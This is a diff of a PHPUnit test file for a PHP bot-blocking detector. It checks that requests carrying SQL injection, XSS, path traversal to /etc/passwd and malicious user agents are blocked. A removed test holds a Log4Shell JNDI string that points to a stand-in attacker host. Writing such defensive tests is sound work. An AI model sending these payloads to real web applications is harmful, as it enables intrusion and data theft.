@@ -1,131 +1,276 @@
 <?php
 
-declare(strict_types=1);
-
 namespace BadBehaviour\Tests\Unit\Detection;
 
 use BadBehaviour\Detection\BlacklistDetector;
 use BadBehaviour\Configuration;
 use BadBehaviour\Util\RequestPackage;
-use BadBehaviour\Core\Result;
 use BadBehaviour\Core\ResultCode;
 use PHPUnit\Framework\TestCase;
 
 class BlacklistDetectorTest extends TestCase
 {
     private BlacklistDetector $detector;
+    private Configuration $config;
 
     protected function setUp(): void
     {
-        $config = Configuration::from_array([], new \BadBehaviour\Adapter\GenericAdapter());
-        $this->detector = new BlacklistDetector($config);
+    	$this->config = Configuration::from_array([
+    		'offsite_forms' => false,
+    	]);
+    	$this->detector = new BlacklistDetector($this->config);
     }
 
-    private function create_package(string $ua, string $uri = '/', string $method = 'GET', array $entity = []): RequestPackage
+    public function test_empty_user_agent_blocked(): void
     {
-        return RequestPackage::create_for_test($ua, '192.0.2.1', $method, $uri, [], $entity);
-    }
-
-    public function test_empty_ua_blocked(): void
-    {
-        $package = $this->create_package('');
+        $package = RequestPackage::create_for_test('', '192.0.2.1');
         $result = $this->detector->detect($package);
-
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
     }
 
-    public function test_malicious_prefix_blocked(): void
+    public function test_malicious_ua_prefix_blocked(): void
     {
-        $package = $this->create_package('sqlmap/1.0');
+        $package = RequestPackage::create_for_test('sqlmap/1.0', '192.0.2.1');
         $result = $this->detector->detect($package);
-
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
     }
 
-    public function test_malicious_substring_blocked(): void
+    public function test_curl_ua_allowed(): void
     {
-        $package = $this->create_package('Mozilla/5.0 <script>alert(1)</script>');
+        // curl is now http_tool, not blocked by prefix checks
+        $package = RequestPackage::create_for_test('curl/8.18.0', '192.0.2.1');
         $result = $this->detector->detect($package);
+        $this->assertNull($result); // Allowed
+    }
 
+    public function test_wget_ua_allowed(): void
+    {
+        $package = RequestPackage::create_for_test('Wget/1.21.4', '192.0.2.1');
+        $result = $this->detector->detect($package);
+        $this->assertNull($result); // Allowed
+    }
+
+    public function test_python_requests_ua_allowed(): void
+    {
+        $package = RequestPackage::create_for_test('python-requests/2.31.0', '192.0.2.1');
+        $result = $this->detector->detect($package);
+        $this->assertNull($result); // Allowed
+    }
+
+    public function test_malicious_ua_substring_blocked(): void
+    {
+        $package = RequestPackage::create_for_test('Mozilla/5.0 <script>alert(1)</script>', '192.0.2.1');
+        $result = $this->detector->detect($package);
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
     }
 
-    public function test_sql_injection_in_url_blocked(): void
+    public function test_ua_regex_blocked(): void
     {
-        $package = $this->create_package('Chrome/120.0', '/page?id=1\' UNION SELECT * FROM users--');
+        $package = RequestPackage::create_for_test('BOT12345', '192.0.2.1');
         $result = $this->detector->detect($package);
+        $this->assertNotNull($result);
+        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
+    }
 
+    public function test_url_sqli_blocked(): void
+    {
+        $package = RequestPackage::create_for_test('Mozilla/5.0', '192.0.2.1', 'GET', '/?id=1+union+select+1');
+        $result = $this->detector->detect($package);
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
     }
 
-    public function test_xss_in_url_blocked(): void
+    public function test_url_xss_blocked(): void
     {
-        $package = $this->create_package('Chrome/120.0', '/search?q=<script>alert(1)</script>');
+        $package = RequestPackage::create_for_test('Mozilla/5.0', '192.0.2.1', 'GET', '/?q=<script>alert(1)</script>');
         $result = $this->detector->detect($package);
-
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
     }
 
-    public function test_path_traversal_blocked(): void
+    public function test_url_path_traversal_blocked(): void
     {
-        $package = $this->create_package('Chrome/120.0', '/../../etc/passwd');
+        $package = RequestPackage::create_for_test('Mozilla/5.0', '192.0.2.1', 'GET', '/?file=../../etc/passwd');
         $result = $this->detector->detect($package);
-
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
     }
 
-    public function test_log4shell_in_ua_blocked(): void
+    public function test_post_form_body_attack_detected(): void
     {
-        $package = $this->create_package('Mozilla/5.0 ${jndi:ldap://evil.com/a}');
-        $result = $this->detector->detect($package);
+    	// Form data with SQLi - SHOULD BE BLOCKED
+    	// Use create_for_test with explicit Content-Type
+    	$package = RequestPackage::create_for_test(
+    		'Mozilla/5.0',
+    		'192.0.2.1',
+    		'POST',
+    		'/comment',
+    		[
+    			'Host' => 'example.com',
+    			'Content-Type' => 'application/x-www-form-urlencoded',
+    			'Accept' => 'text/html',
+    			'Referer' => 'https://example.com/page',
+    		],
+    		['body' => 'test union select 1 from users']
+    		);
 
-        $this->assertNotNull($result);
-        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
+    	$result = $this->detector->detect($package);
+    	$this->assertNotNull($result);
+    	$this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
     }
 
-    public function test_headless_chrome_detected(): void
+    public function test_post_json_body_attack_allowed(): void
     {
-        $package = $this->create_package('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 HeadlessChrome/120.0.0.0');
-        $result = $this->detector->detect($package);
-
-        $this->assertNotNull($result);
-        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
-    }
-
-    public function test_puppeteer_detected(): void
-    {
-        $package = $this->create_package('Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36 Puppeteer/21.0.0');
-        $result = $this->detector->detect($package);
-
-        $this->assertNotNull($result);
-        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
-    }
-
-    public function test_normal_browser_allowed(): void
-    {
-        $package = $this->create_package('Mozilla/5.0 (Windows NT 10.0) Chrome/120.0.0.0 Safari/537.36');
-        $result = $this->detector->detect($package);
-
-        $this->assertNull($result);
-    }
-
-    public function test_post_body_attack_detected(): void
-    {
-        $package = $this->create_package(
-            'Chrome/120.0',
-            '/api',
+        // JSON body with SQLi - NOT INSPECTED (legacy behavior)
+        $package = RequestPackage::create_for_test(
+            'Mozilla/5.0',
+            '192.0.2.1',
             'POST',
-            ['query' => 'UNION SELECT * FROM users']
+            '/api/comment',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'application/json',
+                'Accept' => 'application/json',
+            ],
+            ['body' => 'test union select 1 from users']
         );
-        $result = $this->detector->detect($package);
 
+        $result = $this->detector->detect($package);
+        $this->assertNull($result); // Allowed - JSON not inspected
+    }
+
+    public function test_post_multipart_body_attack_allowed(): void
+    {
+        // Multipart body - NOT INSPECTED (legacy behavior)
+        $package = RequestPackage::create_for_test(
+            'Mozilla/5.0',
+            '192.0.2.1',
+            'POST',
+            '/upload',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'multipart/form-data; boundary=----WebKitFormBoundary',
+                'Accept' => 'text/html',
+            ],
+            ['file' => 'test']
+        );
+
+        $result = $this->detector->detect($package);
+        $this->assertNull($result); // Allowed - multipart not inspected
+    }
+
+    public function test_trackback_suspicious_blocked(): void
+    {
+        // Trackback with browser UA - suspicious
+        $package = RequestPackage::create_for_test(
+            'Mozilla/5.0 Chrome/120.0.0.0',
+            '192.0.2.1',
+            'POST',
+            '/trackback',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'application/x-www-form-urlencoded',
+            ],
+            [
+                'title' => 'Test',
+                'url' => 'https://example.com/post',
+                'blog_name' => 'Test Blog',
+            ]
+        );
+
+        $result = $this->detector->detect($package);
         $this->assertNotNull($result);
         $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
+    }
+
+    public function test_trackback_with_proxy_blocked(): void
+    {
+        $package = RequestPackage::create_for_test(
+            'WordPress/6.0',
+            '192.0.2.1',
+            'POST',
+            '/trackback',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'application/x-www-form-urlencoded',
+                'Via' => '1.1 proxy.example.com',
+            ],
+            [
+                'title' => 'Test',
+                'url' => 'https://example.com/post',
+                'blog_name' => 'Test Blog',
+            ]
+        );
+
+        $result = $this->detector->detect($package);
+        $this->assertNotNull($result);
+        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
+    }
+
+    public function test_document_write_in_form_blocked(): void
+    {
+        $package = RequestPackage::create_for_test(
+            'Mozilla/5.0',
+            '192.0.2.1',
+            'POST',
+            '/comment',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'application/x-www-form-urlencoded',
+            ],
+            ['comment' => 'document.write("evil")']
+        );
+
+        $result = $this->detector->detect($package);
+        $this->assertNotNull($result);
+        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
+    }
+
+    public function test_offsite_form_blocked(): void
+    {
+        $this->config = Configuration::from_array(['offsite_forms' => false]);
+        $this->detector = new BlacklistDetector($this->config);
+
+        $package = RequestPackage::create_for_test(
+            'Mozilla/5.0',
+            '192.0.2.1',
+            'POST',
+            '/comment',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'application/x-www-form-urlencoded',
+                'Referer' => 'https://evil.com/form',
+            ],
+            ['body' => 'test']
+        );
+
+        $result = $this->detector->detect($package);
+        $this->assertNotNull($result);
+        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
+    }
+
+    public function test_offsite_form_allowed_when_enabled(): void
+    {
+        $this->config = Configuration::from_array(['offsite_forms' => true]);
+        $this->detector = new BlacklistDetector($this->config);
+
+        $package = RequestPackage::create_for_test(
+            'Mozilla/5.0',
+            '192.0.2.1',
+            'POST',
+            '/comment',
+            [
+                'Host' => 'example.com',
+                'Content-Type' => 'application/x-www-form-urlencoded',
+                'Referer' => 'https://evil.com/form',
+            ],
+            ['body' => 'test']
+        );
+
+        $result = $this->detector->detect($package);
+        $this->assertNull($result); // Allowed when offsite_forms=true
     }
 }
